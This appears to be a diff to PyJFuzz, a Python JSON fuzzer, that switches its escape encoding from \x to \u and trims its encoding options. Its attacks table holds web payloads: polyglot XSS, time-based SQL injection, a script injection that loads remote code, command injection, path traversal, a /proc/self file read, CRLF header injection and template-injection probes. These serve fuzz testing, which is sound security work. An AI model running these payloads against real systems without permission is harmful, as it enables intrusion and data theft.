@@ -76,7 +76,6 @@ class JSONFactory:
 
     def _json_dumps(self, obj, indent=0):
         replacements = {
-            "\\\\x": "\\x",
             "\\\\u": "\\u",
         }
         if bool(indent):
@@ -138,7 +137,7 @@ class JSONFactory:
         actions = {
             0: lambda x, y: x.append(str(y)),
             1: lambda x, y: x.append(self.fuzz_string(str(y), factor)),
-            2: lambda x, y: x.append(["\\x00", "\\x00", "\\x00", "\\x00"]),
+            2: lambda x, y: x.append(["\\u0000", "\\u0000", "\\u0000", "\\u0000"]),
             3: lambda x, y: x.append(dict({})),
             4: lambda x, y: x.append(-1),
             5: lambda x, y: x.append(dict({self.fuzz_string("AAA", 0): [-1]})),
@@ -204,17 +203,11 @@ class JSONFactory:
         return actions[random.randint(0, factor)](num)
 
     def radamsa(self, to_fuzz):
-        encodings = {
-            0: lambda x: "\\x%02x" % ord(x),
-            1: lambda x: urllib.quote(x),
-            2: lambda x: urllib.quote(urllib.quote(x)),
-            3: lambda x: "&#x%02x;" % ord(x),
-            4: lambda x: "\\u00%02x;" % ord(x),
-            5: lambda x: "&#%d;" % ord(x),
-        }
+        encoding = lambda x: "\\u00%02x;" % ord(x)
+
         attacks = {
-            0: "jaVasCript:/*-/*\\xe2/*\\\\xe2/*'/*\"/**/(/* */oNcliCk=alert() )//%%0D%%0A%%0d%%0a//</stYle/</titLe/</teXtarEa/"
-               "</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(\%s\)//>\\x3e",
+            0: "jaVasCript:/*-/*\\u00e2/*\\\\u00e2/*'/*\"/**/(/* */oNcliCk=alert() )//%%0D%%0A%%0d%%0a//</stYle/</titLe/</teXtarEa/"
+               "</scRipt/--!>\\u003csVg/<sVg/oNloAd=alert(\%s\)//>\\u003e",
             1: "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR"
                "(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)"
                "<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/ FROM some_table WHERE ex = %s",
@@ -222,16 +215,17 @@ class JSONFactory:
             3: "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/%s",
             4: "</script><svg/onload='+/\"/+/onmouseover=1/+(s=document.createElement(/script/.source),"
                "s.stack=Error().stack,s.src=(/,/+/%s.net/).slice(2),document.documentElement.appendChild(s))//'>",
-            5: "%s&sleep 5&id'\\\"\\xe20&sleep 5&id\\xe2'",
+            5: "%s&sleep 5&id'\\\"\\u00e20&sleep 5&id\\u00e2'",
             6: "..\\..\\..\\..\\%s.ini",
             7: "data:text/html,https://%s:a.it@www.\\it",
             8: "file:///proc/self/%s",
-            9: "\\x0d\\xa0BB: %s@mail.it\\x0d\\x0aLocation: www.google.it",
+            9: "\\u000d\\u00a0BB: %s@mail.it\\u000d\\u000aLocation: www.google.it",
             10: "||calc.exe&&id||%s",
             11: "${7*7}a{{%s}}b",
             12: "{{'%s'*7}}",
         }
         attack = attacks[random.randint(0, 12)]
+        print attack
         to_fuzz = attack % to_fuzz
         p1 = subprocess.Popen(['/bin/echo', to_fuzz], stdout=subprocess.PIPE)
         p2 = subprocess.Popen(["radamsa"], stdin=p1.stdout, stdout=subprocess.PIPE)
@@ -240,8 +234,7 @@ class JSONFactory:
         p2.stdout.close()
         del p1
         del p2
-        encode = encodings[random.randint(0, 5)]
-        return "".join(encode(x) if x not in string.printable.strip("\t\n\r\x0b\x0c") else x for x in output)
+        return "".join(encoding(x) if x not in string.printable.strip("\t\n\r\x0b\x0c") else x for x in output)
 
 if __name__ == "__main__":
     sys.stderr.write("PyJFuzz v{0} - {1} - {2}\n".format(__version__, __author__, __mail__))
